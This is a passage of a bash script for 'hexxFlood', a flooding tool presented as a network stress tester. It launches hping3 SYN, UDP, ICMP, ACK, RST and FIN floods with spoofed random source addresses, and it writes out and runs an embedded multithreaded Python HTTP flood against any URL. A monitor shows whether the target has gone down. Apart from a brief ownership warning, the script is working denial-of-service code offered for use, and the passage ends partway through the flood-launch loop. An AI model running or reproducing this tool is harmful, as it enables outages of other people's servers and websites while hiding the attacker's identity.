#!/bin/bash

# ============================================================
# hexxFlood - Ultimate Network Stress Testing Tool
# Version: 1.0
# Author: Cywarx
# ============================================================

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Version
VERSION="1.0"
REPO_URL="https://github.com/Cywarx/hexxFlood.git"

# Configuration
CONFIG_FILE="$HOME/.hexxFlood_config"
TARGET="192.168.1.14"
THREADS=50
PACKET_SIZE=65495
DELAY="u1"
INTERFACE="wlan0"
ATTACK_DURATION=0
SPOOF_IP=true
RANDOM_PORTS=true
TARGET_TYPE="ip"

# Monitoring
AUTO_MONITOR=true        # auto-open a monitor terminal when an attack starts
MONITOR_WINDOWS="full"   # comma-separated modes -> one auto window per mode
MONITOR_MODE="full"      # mode used by standalone --monitor
RUN_MONITOR_ONLY=false   # set by --monitor to run the monitor and exit

if [ -f "$CONFIG_FILE" ]; then
    source "$CONFIG_FILE"
fi

# Resolve where this script (and monitor.sh) live, even via the wrapper/symlink
SCRIPT_DIR="$(cd "$(dirname "$(readlink -f "${BASH_SOURCE[0]}")")" && pwd)"
MONITOR_SCRIPT="$SCRIPT_DIR/monitor.sh"

show_banner() {
    clear
    echo -e "${RED}"
    echo "╔════════════════════════════════════════════════════════════════════════════════╗"
    echo "║                                                                                ║"
    echo "║   ██╗  ██╗███████╗██╗  ██╗██╗  ██╗███████╗██╗      ██████╗  ██████╗ ██████╗    ║"
    echo "║   ██║  ██║██╔════╝╚██╗██╔╝╚██╗██╔╝██╔════╝██║     ██╔═══██╗██╔═══██╗██╔══██╗   ║"
    echo "║   ███████║█████╗   ╚███╔╝  ╚███╔╝ █████╗  ██║     ██║   ██║██║   ██║██║  ██║   ║"
    echo "║   ██╔══██║██╔══╝   ██╔██╗  ██╔██╗ ██╔══╝  ██║     ██║   ██║██║   ██║██║  ██║   ║"
    echo "║   ██║  ██║███████╗██╔╝ ██╗██╔╝ ██╗██║     ███████╗╚██████╔╝╚██████╔╝██████╔╝   ║"
    echo "║   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝    ║"
    echo "║                                                                                ║"
    echo "║                   Ultimate Network Stress Testing Tool v1.0                    ║"
    echo "║                              IP & Web URL Support                              ║"
    echo "║                                Use Responsibly!                                ║"
    echo "╠════════════════════════════════════════════════════════════════════════════════╣"
    echo "║                             Author: CyWarX                                     ║"
    echo "╚════════════════════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

show_help() {
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo -e "${WHITE}📖 hexxFlood - Usage Guide${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${YELLOW}Basic Usage:${NC}"
    echo "  hexxFlood [OPTIONS]"
    echo ""
    echo -e "${YELLOW}Target Options:${NC}"
    echo "  -t, --target IP          Target IP address"
    echo "  -u, --url URL            Target Web URL (http://example.com)"
    echo ""
    echo -e "${YELLOW}Attack Options:${NC}"
    echo "  -p, --threads NUM        Number of threads (1-200, default: 50)"
    echo "  -s, --size BYTES         Packet size (64-65495, default: 65495)"
    echo "  -d, --delay MS           Delay (u1,u10,u100, default: u1)"
    echo "  -i, --interface IFACE    Network interface (default: wlan0)"
    echo "  -m, --mode MODE          Mode: easy|medium|high|extreme|custom"
    echo "  -P, --ports PORTS        Comma-separated ports"
    echo "  -T, --type TYPES         Types: syn,udp,icmp,ack,rst,fin,all,http"
    echo "  -D, --duration SEC       Duration in seconds (0=infinite)"
    echo "  --no-spoof               Disable IP spoofing"
    echo "  --fixed-ports            Use fixed ports"
    echo ""
    echo -e "${YELLOW}Monitoring Options:${NC}"
    echo "  --monitor                Open the live monitor only (no attack)"
    echo "  --monitor-mode MODE      Monitor mode: ping|network|system|full|log (default: full)"
    echo "  --auto-monitor [MODES]   Auto-open monitor window(s) on attack start (default: on, full)"
    echo "                           MODES is comma-separated -> one window each, e.g. full,ping,system"
    echo "  --no-monitor             Do not auto-open any monitor window"
    echo ""
    echo -e "${YELLOW}Other Options:${NC}"
    echo "  -U, --update             Update hexxFlood to the latest version (git pull)"
    echo "  -V, --version            Show version and exit"
    echo "  -h, --help               Show this help"
    echo ""
    echo -e "${YELLOW}Attack Modes:${NC}"
    echo "  easy    - 10 threads, basic attacks"
    echo "  medium  - 25 threads, medium attacks"
    echo "  high    - 50 threads, high attacks"
    echo "  extreme - 100 threads, extreme attacks"
    echo "  custom  - Use your own settings"
    echo ""
    echo -e "${YELLOW}Examples:${NC}"
    echo "  # IP Attack"
    echo "  hexxFlood -t 192.168.1.10 -m extreme"
    echo ""
    echo "  # Web URL Attack"
    echo "  hexxFlood -u http://example.com -m extreme"
    echo "  hexxFlood -u https://example.com -T http -p 100"
    echo "  hexxFlood -u http://example.com:8080 -m high -D 60"
    echo ""
    echo -e "${YELLOW}  # Attack + auto-open 3 monitor windows${NC}"
    echo "  hexxFlood -t 192.168.1.10 -m extreme --auto-monitor full,ping,system"
    echo ""
    echo -e "${YELLOW}  # Just watch a target (no attack)${NC}"
    echo "  hexxFlood --monitor -t 192.168.1.10"
    echo "  hexxFlood --monitor --monitor-mode ping -t 192.168.1.10"
    echo ""
}

parse_url() {
    local url="$1"
    local stripped="${url#http://}"
    stripped="${stripped#https://}"
    if [[ "$stripped" == *":"* ]]; then
        WEB_HOST="${stripped%:*}"
        WEB_PORT="${stripped#*:}"
    else
        WEB_HOST="$stripped"
        if [[ "$url" == https://* ]]; then
            WEB_PORT="443"
        else
            WEB_PORT="80"
        fi
    fi
    WEB_IP=$(dig +short "$WEB_HOST" | head -1)
    if [ -z "$WEB_IP" ]; then
        WEB_IP=$(ping -c 1 "$WEB_HOST" 2>/dev/null | head -1 | grep -oP '(?<=\().*(?=\))' || echo "")
    fi
    if [ -z "$WEB_IP" ]; then
        echo -e "${RED}❌ Could not resolve hostname: $WEB_HOST${NC}"
        exit 1
    fi
    echo -e "${GREEN}✅ Resolved $WEB_HOST -> $WEB_IP${NC}"
    TARGET="$WEB_IP"
    TARGET_TYPE="url"
}

http_flood() {
    local url="$1"
    local threads="${2:-50}"
    local duration="${3:-0}"
    
    echo -e "${YELLOW}🌐 Starting HTTP flood on $url${NC}"
    echo -e "${YELLOW}   Threads: $threads${NC}"
    
    cat > /tmp/http_flood.py << 'PYEOF'
import sys, time, threading, urllib.request, urllib.error, ssl, random
from concurrent.futures import ThreadPoolExecutor

url = sys.argv[1]
threads = int(sys.argv[2])
duration = int(sys.argv[3])

ssl._create_default_https_context = ssl._create_unverified_context

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
]

def make_request():
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache'
    }
    try:
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=5) as response:
            return response.read()
    except:
        return None

def worker():
    while running:
        try:
            make_request()
        except:
            pass

running = True
start_time = time.time()

print(f"Starting HTTP flood on {url} with {threads} threads")

with ThreadPoolExecutor(max_workers=threads) as executor:
    futures = [executor.submit(worker) for _ in range(threads)]
    if duration > 0:
        time.sleep(duration)
        running = False
    else:
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            running = False
    for future in futures:
        future.cancel()

print("HTTP flood stopped")
PYEOF

    if [ -f "/opt/hexxFlood-venv/bin/python" ]; then
        $DETACH /opt/hexxFlood-venv/bin/python /tmp/http_flood.py "$url" "$threads" "$duration" </dev/null >/dev/null 2>&1 &
    else
        $DETACH python3 /tmp/http_flood.py "$url" "$threads" "$duration" </dev/null >/dev/null 2>&1 &
    fi
}

# True if $1 is inside a git work tree. Runs the check as the invoking user
# when we're root (via sudo) so git doesn't reject a user-owned checkout with
# a "dubious ownership" error.
git_is_repo() {
    if [ "$EUID" -eq 0 ] && [ -n "${SUDO_USER:-}" ]; then
        sudo -u "$SUDO_USER" git -C "$1" rev-parse --is-inside-work-tree &>/dev/null
    else
        git -C "$1" rev-parse --is-inside-work-tree &>/dev/null
    fi
}

# Copy the refreshed runtime files from a source checkout ($1) into the install
# dir ($2). Used after pulling, since the install dir is a plain copy.
deploy_runtime() {
    local src="$1" dst="$2" f
    [ "$src" -ef "$dst" ] && return 0
    for f in hexxFlood.sh monitor.sh quick.sh README.md LICENSE; do
        [ -f "$src/$f" ] && cp -f "$src/$f" "$dst/$f"
    done
    chmod +x "$dst"/*.sh 2>/dev/null
    echo -e "${GREEN}✅ Redeployed updated files to $dst${NC}"
}

self_update() {
    # Resolve the real script location even when invoked via the wrapper/symlink
    local script_dir
    script_dir="$(cd "$(dirname "$(readlink -f "${BASH_SOURCE[0]}")")" && pwd)"

    echo -e "${CYAN}🔄 Checking for updates in $script_dir ...${NC}"

    if ! command -v git &>/dev/null; then
        echo -e "${RED}❌ git is not installed. Install it with: sudo apt install git${NC}"
        exit 1
    fi

    # The install dir (e.g. /opt/hexxFlood) is a plain copy, not a git checkout,
    # so we update in the original source checkout recorded at install time and
    # then redeploy the refreshed files into the install dir.
    local repo_dir="$script_dir"
    local deploy=false
    if ! git_is_repo "$repo_dir"; then
        local src=""
        [ -f "$script_dir/.source_dir" ] && src="$(cat "$script_dir/.source_dir" 2>/dev/null)"
        if [ -n "$src" ] && git_is_repo "$src"; then
            repo_dir="$src"
            deploy=true
            echo -e "${CYAN}   Install dir is a copy — updating source checkout: $repo_dir${NC}"
        else
            echo -e "${RED}❌ $script_dir is not a git repository and no source checkout was found.${NC}"
            echo -e "${YELLOW}   Re-run the installer from a git clone to enable updates:${NC}"
            echo -e "   git clone $REPO_URL && cd hexxFlood && sudo ./setup.sh"
            exit 1
        fi
    fi

    # Run git as the invoking user (not root) so repo files keep the right owner
    local git_cmd=(git -C "$repo_dir")
    if [ "$EUID" -eq 0 ] && [ -n "${SUDO_USER:-}" ]; then
        git_cmd=(sudo -u "$SUDO_USER" git -C "$repo_dir")
    fi

    local branch
    branch="$("${git_cmd[@]}" rev-parse --abbrev-ref HEAD 2>/dev/null)"
    [ -z "$branch" ] || [ "$branch" = "HEAD" ] && branch="main"

    if ! "${git_cmd[@]}" fetch --quiet origin "$branch" 2>/dev/null; then
        echo -e "${RED}❌ Could not reach the remote. Check your internet connection.${NC}"
        exit 1
    fi

    local local_rev remote_rev
    local_rev="$("${git_cmd[@]}" rev-parse HEAD)"
    remote_rev="$("${git_cmd[@]}" rev-parse "origin/$branch" 2>/dev/null)"

    if [ "$local_rev" = "$remote_rev" ]; then
        echo -e "${GREEN}✅ Already up to date (v$VERSION, $("${git_cmd[@]}" rev-parse --short HEAD)).${NC}"
        # Still sync the install dir in case it drifted from the source checkout
        [ "$deploy" = true ] && deploy_runtime "$repo_dir" "$script_dir"
        exit 0
    fi

    echo -e "${YELLOW}⬆️  Update available: $("${git_cmd[@]}" rev-parse --short HEAD) → $("${git_cmd[@]}" rev-parse --short origin/$branch)${NC}"
    if "${git_cmd[@]}" pull --ff-only origin "$branch"; then
        chmod +x "$repo_dir"/*.sh 2>/dev/null
        [ "$deploy" = true ] && deploy_runtime "$repo_dir" "$script_dir"
        echo -e "${GREEN}✅ hexxFlood updated to the latest version!${NC}"
        echo -e "${CYAN}Recent changes:${NC}"
        "${git_cmd[@]}" log --oneline -5
    else
        echo -e "${RED}❌ Update failed — you likely have local changes that conflict.${NC}"
        echo -e "${YELLOW}   Inspect with: git -C $repo_dir status${NC}"
        echo -e "${YELLOW}   Discard local changes with: git -C $repo_dir reset --hard origin/$branch${NC}"
        exit 1
    fi
    exit 0
}

# ---- External monitor terminal support -----------------------------------

# Work out which X display / auth / dbus to use so GUI terminals can be
# opened even when hexxFlood is running under sudo (as root).
resolve_display() {
    local real_user="${SUDO_USER:-$USER}"
    MON_HOME=$(getent passwd "$real_user" | cut -d: -f6)
    MON_HOME="${MON_HOME:-$HOME}"
    local uid; uid=$(id -u "$real_user" 2>/dev/null)

    # Detect a real X display. Leave MON_DISPLAY empty on headless/SSH boxes
    # so we cleanly skip monitor windows instead of guessing ":0".
    if [ -n "$DISPLAY" ]; then
        MON_DISPLAY="$DISPLAY"
    else
        MON_DISPLAY=$(who 2>/dev/null | grep -oE '\(:[0-9]+(\.[0-9]+)?\)' | tr -d '()' | head -1)
    fi
    MON_XAUTH="${XAUTHORITY:-$MON_HOME/.Xauthority}"
    MON_DBUS="${DBUS_SESSION_BUS_ADDRESS:-unix:path=/run/user/${uid:-0}/bus}"
}

# Open a single monitor window running monitor.sh in a new terminal.
# $1 = monitor mode (ping|network|system|full|log). Returns 1 if no
# terminal emulator is available.
launch_one_monitor() {
    local mode="$1"
    local title="hexxFlood Monitor [$mode] -> $TARGET"
    local q_script; printf -v q_script '%q' "$MONITOR_SCRIPT"
    local mon_str="bash $q_script -t $TARGET -i $INTERFACE -m $mode"
    local -a argv=(bash "$MONITOR_SCRIPT" -t "$TARGET" -i "$INTERFACE" -m "$mode")
    local -a cmd=()
    local term

    for term in gnome-terminal konsole qterminal xfce4-terminal kitty alacritty tilix xterm x-terminal-emulator; do
        command -v "$term" &>/dev/null || continue
        case "$term" in
            gnome-terminal)      cmd=(gnome-terminal --title="$title" -- "${argv[@]}") ;;
            konsole)             cmd=(konsole -p "tabtitle=$title" -e "${argv[@]}") ;;
            qterminal)           cmd=(qterminal -e "${argv[@]}") ;;
            xfce4-terminal)      cmd=(xfce4-terminal --title="$title" -e "$mon_str") ;;
            kitty)               cmd=(kitty --title "$title" "${argv[@]}") ;;
            alacritty)           cmd=(alacritty -t "$title" -e "${argv[@]}") ;;
            tilix)               cmd=(tilix -t "$title" -e "$mon_str") ;;
            xterm)               cmd=(xterm -T "$title" -e "${argv[@]}") ;;
            x-terminal-emulator) cmd=(x-terminal-emulator -e "${argv[@]}") ;;
        esac
        break
    done

    [ ${#cmd[@]} -eq 0 ] && return 1

    # Launch as the real (non-root) user on their graphical session
    if [ "$EUID" -eq 0 ] && [ -n "${SUDO_USER:-}" ]; then
        sudo -u "$SUDO_USER" env HOME="$MON_HOME" DISPLAY="$MON_DISPLAY" \
            XAUTHORITY="$MON_XAUTH" DBUS_SESSION_BUS_ADDRESS="$MON_DBUS" \
            "${cmd[@]}" >/dev/null 2>&1 &
    else
        DISPLAY="$MON_DISPLAY" XAUTHORITY="$MON_XAUTH" \
            DBUS_SESSION_BUS_ADDRESS="$MON_DBUS" "${cmd[@]}" >/dev/null 2>&1 &
    fi
    return 0
}

# Auto-open the configured monitor window(s) when an attack starts.
launch_monitors() {
    [ "$AUTO_MONITOR" = true ] || return 0

    if [ ! -f "$MONITOR_SCRIPT" ]; then
        echo -e "${YELLOW}⚠️  monitor.sh not found at $MONITOR_SCRIPT — skipping monitor windows.${NC}"
        return 0
    fi

    resolve_display
    if [ -z "$MON_DISPLAY" ]; then
        echo -e "${YELLOW}⚠️  No graphical display detected — skipping auto monitor windows.${NC}"
        echo -e "${YELLOW}   Open one manually in another terminal:  hexxFlood --monitor -t $TARGET${NC}"
        echo ""
        return 0
    fi

    local opened=0 mode
    for mode in $(echo "$MONITOR_WINDOWS" | tr ',' ' '); do
        case "$mode" in
            ping|network|system|full|log) ;;
            *) echo -e "${YELLOW}⚠️  Unknown monitor mode '$mode' — skipping.${NC}"; continue ;;
        esac
        if launch_one_monitor "$mode"; then
            echo -e "${GREEN}🖥️  Opened monitor window: ${WHITE}$mode${NC}"
            opened=$((opened + 1))
            sleep 0.3
        else
            echo -e "${YELLOW}⚠️  No supported terminal emulator found — cannot auto-open monitors.${NC}"
            echo -e "${YELLOW}   Install one of: xterm, gnome-terminal, konsole, xfce4-terminal, qterminal.${NC}"
            echo -e "${YELLOW}   Or run in another terminal:  hexxFlood --monitor -t $TARGET${NC}"
            break
        fi
    done
    [ "$opened" -gt 0 ] && echo ""
}

parse_args() {
    while [[ $# -gt 0 ]]; do
        case $1 in
            -t|--target) TARGET="$2"; TARGET_TYPE="ip"; shift 2 ;;
            -u|--url) URL="$2"; parse_url "$URL"; shift 2 ;;
            --web) TARGET_TYPE="url"; shift ;;
            -p|--threads) THREADS="$2"; shift 2 ;;
            -s|--size) PACKET_SIZE="$2"; shift 2 ;;
            -d|--delay) DELAY="$2"; shift 2 ;;
            -i|--interface) INTERFACE="$2"; shift 2 ;;
            -m|--mode) MODE="$2"; shift 2 ;;
            -P|--ports) CUSTOM_PORTS="$2"; shift 2 ;;
            -T|--type) ATTACK_TYPES="$2"; shift 2 ;;
            -D|--duration) ATTACK_DURATION="$2"; shift 2 ;;
            --no-spoof) SPOOF_IP=false; shift ;;
            --fixed-ports) RANDOM_PORTS=false; shift ;;
            --monitor) RUN_MONITOR_ONLY=true; shift ;;
            --monitor-mode) MONITOR_MODE="$2"; shift 2 ;;
            --auto-monitor)
                AUTO_MONITOR=true
                if [[ -n "$2" && "$2" != -* ]]; then MONITOR_WINDOWS="$2"; shift 2; else shift; fi
                ;;
            --no-monitor|--no-auto-monitor) AUTO_MONITOR=false; shift ;;
            -U|--update) self_update ;;
            -V|--version) echo -e "${WHITE}hexxFlood v$VERSION${NC}"; exit 0 ;;
            -h|--help) show_help; exit 0 ;;
            *) echo -e "${RED}Unknown option: $1${NC}"; show_help; exit 1 ;;
        esac
    done
}

set_mode() {
    case $MODE in
        easy) THREADS=10; DELAY="u100"; ATTACK_TYPES="syn,udp,icmp" ;;
        medium) THREADS=25; DELAY="u10"; ATTACK_TYPES="syn,udp,icmp,ack" ;;
        high) THREADS=50; DELAY="u1"; ATTACK_TYPES="syn,udp,icmp,ack,rst,fin" ;;
        extreme) THREADS=100; DELAY="u1"; ATTACK_TYPES="all" ;;
        custom) ;;
        *) THREADS=50; ATTACK_TYPES="all" ;;
    esac
}

get_packet_count() {
    local c
    c=$(ifconfig "${1:-$INTERFACE}" 2>/dev/null | grep "TX packets" | awk '{print $5}' | head -1)
    echo "${c:-0}"
}

monitor_attack() {
    # Reuse the baseline captured in main() (set before launch) so the timer and
    # packet totals count from the real attack start; fall back if unset.
    local start_time=${ATTACK_START_TIME:-$(date +%s)}
    local initial_packets=${ATTACK_INITIAL_PACKETS:-$(get_packet_count)}
    local duration=$ATTACK_DURATION
    ATTACK_START_TIME=$start_time
    ATTACK_INITIAL_PACKETS=$initial_packets

    # Duration label for the header
    local dur_disp="∞"; [ "$duration" -gt 0 ] && dur_disp="${duration}s"

    # ---- streaming header: printed ONCE; the whole run scrolls below it ----
    ( stty sane </dev/tty ) >/dev/null 2>&1 || true   # clean terminal before streaming
    show_banner
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo -e "${WHITE}                 ☢️  hexxFlood LIVE STREAM  ☢️${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    if [ "$TARGET_TYPE" = "url" ]; then
        echo -e "${YELLOW}📍 Target:${NC} $URL  ${CYAN}(${TARGET})${NC}"
    else
        echo -e "${YELLOW}📍 Target:${NC} $TARGET"
    fi
    echo -e "${YELLOW}🧵 Threads:${NC} $THREADS   ${YELLOW}📦 Packet:${NC} ${PACKET_SIZE}B   ${YELLOW}🕒 Duration:${NC} ${dur_disp}"
    echo -e "${RED}Press Ctrl+C to stop — the full run scrolls below${NC}"

    # Surface the real hping3 banner (proof the flood engine actually launched
    # against the target with the requested packet size / mode).
    if [ -s "${HPING_LOG:-/nonexistent}" ]; then
        echo -e "${PURPLE}hping3 »${NC} $(head -1 "$HPING_LOG")"
    fi
    echo -e "${CYAN}────────────────────────────────────────────────────────────────${NC}"

    # Track the previous tick so we can show a LIVE (instantaneous) packet rate
    # instead of only a lifetime average — a live pps that climbs is the clearest
    # signal that the attack is actually sending.
    local prev_packets=$initial_packets
    local prev_time=$start_time

    while true; do
        if [ $duration -gt 0 ]; then
            local elapsed_chk=$(( $(date +%s) - start_time ))
            if [ $elapsed_chk -ge $duration ]; then
                echo -e "${YELLOW}⏱️  Attack duration completed${NC}"
                break
            fi
        fi

        local now=$(date +%s)
        local current_packets=$(get_packet_count)
        local elapsed=$(( now - start_time ))
        local packets_sent=$((current_packets - initial_packets))

        # Instantaneous rate = packets since the last tick / seconds since it.
        local dt=$(( now - prev_time )); [ $dt -le 0 ] && dt=1
        local dpkts=$(( current_packets - prev_packets ))
        [ $dpkts -lt 0 ] && dpkts=0
        local pps=$(( dpkts / dt ))                    # live pps (this tick)
        local avg=0
        [ $elapsed -gt 0 ] && avg=$(( packets_sent / elapsed ))   # lifetime avg
        prev_packets=$current_packets
        prev_time=$now

        local bw=0
        [ $pps -gt 0 ] && bw=$(( (pps * PACKET_SIZE * 8) / 1000000 ))

        local resp=$(ping -c 1 -W 1 $TARGET 2>/dev/null | grep -o "time=[0-9.]* ms" | head -1)
        if [ -z "$resp" ]; then resp="${RED}DOWN${NC}"; else resp="${GREEN}${resp}${NC}"; fi

        local hcount=$(pgrep -c hping3 2>/dev/null || echo 0)
        local httpc=$(pgrep -cf http_flood.py 2>/dev/null || echo 0)
        local cpu=$(top -bn1 | grep -m1 Cpu | awk '{print $2}')

        # Clear "is it working?" indicator: green when packets are climbing and
        # flood processes are alive, red idle otherwise.
        local status
        if { [ "$hcount" -gt 0 ] || [ "$httpc" -gt 0 ]; } && [ $dpkts -gt 0 ]; then
            status="${GREEN}⚡ SENDING${NC}"
        else
            status="${RED}·· idle  ${NC}"
        fi

        local rem=""
        [ $duration -gt 0 ] && rem="  ${YELLOW}rem${NC} $((duration - elapsed))s"

        # One streaming line per tick -> the whole run scrolls by
        echo -e "${CYAN}[$(date +%H:%M:%S)]${NC} ${status}  ${YELLOW}t${NC} ${elapsed}s${rem}  ${YELLOW}pkts${NC} $(printf "%'d" $packets_sent)  ${YELLOW}pps${NC} $(printf "%'d" $pps)  ${YELLOW}avg${NC} $(printf "%'d" $avg)  ${YELLOW}bw${NC} ${bw}Mbps  ${YELLOW}resp${NC} ${resp}  ${YELLOW}cpu${NC} ${cpu:-0}%  ${YELLOW}proc${NC} h:${hcount} w:${httpc}"

        sleep 2
    done
    # Duration finished: reuse the same clean, structured shutdown as Ctrl+C
    cleanup
}

cleanup() {
    # Ignore further Ctrl+C while tidying up, and never run the body twice
    trap '' SIGINT SIGTERM
    [ "${CLEANUP_DONE:-0}" = 1 ] && exit 0
    CLEANUP_DONE=1

    # A flood child killed with -9 can leave the TTY in raw mode (newlines stop
    # doing a carriage return -> the "staircase" mess). Restore the REAL terminal
    # (target /dev/tty, not the script's stdin which may be redirected).
    ( stty sane </dev/tty ) >/dev/null 2>&1 || true
    printf '\033[?7h\033[?25h\033[0m\r' 2>/dev/null

    # Detach background flood jobs so bash won't print async "Killed" notices
    disown -a 2>/dev/null || true

    # Gently SIGINT the logged sampler first so hping3 flushes its real
    # "N packets transmitted" summary to the log before we hard-kill the rest.
    if [ -n "${HPING_SAMPLER_PID:-}" ]; then
        sudo kill -INT "$HPING_SAMPLER_PID" 2>/dev/null
        sleep 0.3
    fi
    local hping_summary=""
    if [ -f "${HPING_LOG:-/nonexistent}" ]; then
        hping_summary=$(grep -a "packets transmitted" "$HPING_LOG" | tail -1)
    fi

    # Stop everything quietly (hide job-control + kill output)
    { sudo pkill -9 hping3; sudo pkill -9 -f http_flood.py; } >/dev/null 2>&1
    rm -f /tmp/http_flood.py "${HPING_LOG:-/tmp/hexxflood_hping.log}" 2>/dev/null
    wait 2>/dev/null

    # Final stats (if the attack actually started)
    local elapsed=0 total=0 avg=0
    if [ -n "${ATTACK_START_TIME:-}" ]; then
        elapsed=$(( $(date +%s) - ATTACK_START_TIME ))
        total=$(( $(get_packet_count) - ${ATTACK_INITIAL_PACKETS:-0} ))
        [ "$elapsed" -gt 0 ] && avg=$(( total / elapsed ))
    fi

    # Rules that adapt to the terminal width so they never wrap on small screens
    local cols; cols=$(tput cols 2>/dev/null)
    [[ "$cols" =~ ^[0-9]+$ ]] && [ "$cols" -gt 0 ] || cols=64
    [ "$cols" -gt 64 ] && cols=64
    local heavy light
    heavy=$(printf '━%.0s' $(seq 1 "$cols"))
    light=$(printf '─%.0s' $(seq 1 "$cols"))

    # Print each line with an explicit carriage return (\r\n). This guarantees
    # every line starts at column 0 even if a killed child left the TTY in raw
    # mode — so the summary is always left-aligned, never "staircased".
    pl() { printf '%b\r\n' "$1"; }

    # Structured summary appended BELOW the existing output (nothing is cleared,
    # so the full attack view stays visible and the stats land at the very end).
    pl ""
    pl ""
    pl "${CYAN}${heavy}${NC}"
    pl "   ${YELLOW}🛑  hexxFlood — Attack Stopped${NC}"
    pl "${CYAN}${heavy}${NC}"
    pl ""
    pl "   ${GREEN}✔${NC}  hping3 flood processes terminated"
    pl "   ${GREEN}✔${NC}  HTTP flood terminated"
    pl "   ${GREEN}✔${NC}  Temporary files removed"
    pl ""
    if [ -n "${ATTACK_START_TIME:-}" ]; then
        pl "   ${YELLOW}📊 Final Statistics${NC}"
        pl "      Total Packets Sent : ${GREEN}$(printf "%'d" "$total")${NC}"
        pl "      Total Attack Time  : ${GREEN}${elapsed}s${NC}"
        pl "      Average PPS        : ${GREEN}$(printf "%'d" "$avg")${NC}"
        [ -n "$hping_summary" ] && pl "      hping3 (sampler)   : ${GREEN}${hping_summary}${NC}"
        pl ""
    fi
    pl "${CYAN}${light}${NC}"
    pl "   ${GREEN}✅ Cleanup complete.${NC}  Stay ethical. 👋"
    pl "${CYAN}${light}${NC}"
    pl ""
    exit 0
}

main() {
    trap cleanup SIGINT SIGTERM
    show_banner
    parse_args "$@"

    # Standalone monitor: run the monitor and exit (no attack)
    if [ "$RUN_MONITOR_ONLY" = true ]; then
        if [ ! -f "$MONITOR_SCRIPT" ]; then
            echo -e "${RED}❌ monitor.sh not found at $MONITOR_SCRIPT${NC}"; exit 1
        fi
        trap - SIGINT SIGTERM
        exec bash "$MONITOR_SCRIPT" -t "$TARGET" -i "$INTERFACE" -m "$MONITOR_MODE"
    fi

    [ -n "$MODE" ] && set_mode

    # Validate numeric inputs against documented ranges
    if ! [[ "$THREADS" =~ ^[0-9]+$ ]] || [ "$THREADS" -lt 1 ] || [ "$THREADS" -gt 200 ]; then
        echo -e "${RED}❌ Threads must be a number between 1 and 200${NC}"; exit 1
    fi
    if ! [[ "$PACKET_SIZE" =~ ^[0-9]+$ ]] || [ "$PACKET_SIZE" -lt 64 ] || [ "$PACKET_SIZE" -gt 65495 ]; then
        echo -e "${RED}❌ Packet size must be between 64 and 65495${NC}"; exit 1
    fi
    if ! ifconfig "$INTERFACE" &>/dev/null; then
        echo -e "${YELLOW}⚠️  Interface '$INTERFACE' not found — packet stats may show 0. Use -i to set the right one.${NC}"
    fi

    echo -e "${YELLOW}Configuration:${NC}"
    echo "  Target Type: ${TARGET_TYPE^^}"
    [ "$TARGET_TYPE" = "url" ] && echo "  URL: $URL"
    echo "  Target IP: $TARGET"
    echo "  Threads: $THREADS"
    echo "  Mode: ${MODE:-custom}"
    echo "  Attack Types: ${ATTACK_TYPES:-all}"
    echo "  Packet Size: $PACKET_SIZE bytes"
    echo "  Delay: $DELAY"
    echo "  Duration: ${ATTACK_DURATION:-Infinite}"
    echo ""
    echo -e "${RED}⚠️ WARNING: Use only on networks you OWN or have permission to test!${NC}"
    echo ""

    # Baseline for the final summary — captured BEFORE any launch so a Ctrl+C
    # during startup still reports total packets / time / PPS.
    ATTACK_START_TIME=$(date +%s)
    ATTACK_INITIAL_PACKETS=$(get_packet_count)

    # Fully detach flood children from the controlling terminal so they can't
    # put it into raw mode (the "staircase" bug). setsid gives them their own
    # session with no controlling tty; fall back gracefully if unavailable.
    DETACH="setsid"; command -v setsid >/dev/null 2>&1 || DETACH=""

    # Auto-open monitor terminal(s) so progress is visible while the attack runs
    launch_monitors

    if [[ "$ATTACK_TYPES" == *"http"* ]] || [ "$TARGET_TYPE" = "url" ]; then
        echo -e "${GREEN}🌐 Starting HTTP flood on $URL${NC}"
        http_flood "$URL" "$THREADS" "$ATTACK_DURATION"
        echo -e "${GREEN}✅ HTTP flood started${NC}"
        echo ""
    fi
    
    [ "$ATTACK_TYPES" = "all" ] && ATTACK_TYPES="syn,udp,icmp,ack,rst,fin"

    if echo ",$ATTACK_TYPES," | grep -qE ',(syn|udp|icmp|ack|rst|fin),'; then
        echo -e "${GREEN}Starting network layer attack on $TARGET...${NC}"
        echo -e "${YELLOW}Press Ctrl+C to stop${NC}"
        echo ""

        # IP spoofing — disabled by --no-spoof
        SPOOF_FLAG=""
        [ "$SPOOF_IP" = true ] && SPOOF_FLAG="--rand-source"

        # Destination ports — custom (-P) overrides the per-type defaults
        if [ -n "$CUSTOM_PORTS" ]; then
            TCP_PORTS=$(echo "$CUSTOM_PORTS" | tr ',' ' ')
            UDP_PORTS="$TCP_PORTS"
        else
            TCP_PORTS="80"
            UDP_PORTS="53"
        fi

        # Incrementing dst port (++) by default; --fixed-ports uses a static port
        PP=""
        [ "$RANDOM_PORTS" = true ] && PP="++"

        for i in $(seq 1 $THREADS); do
            for type in $(echo "$ATTACK_TYPES" | tr ',' ' '); do
                case $type in
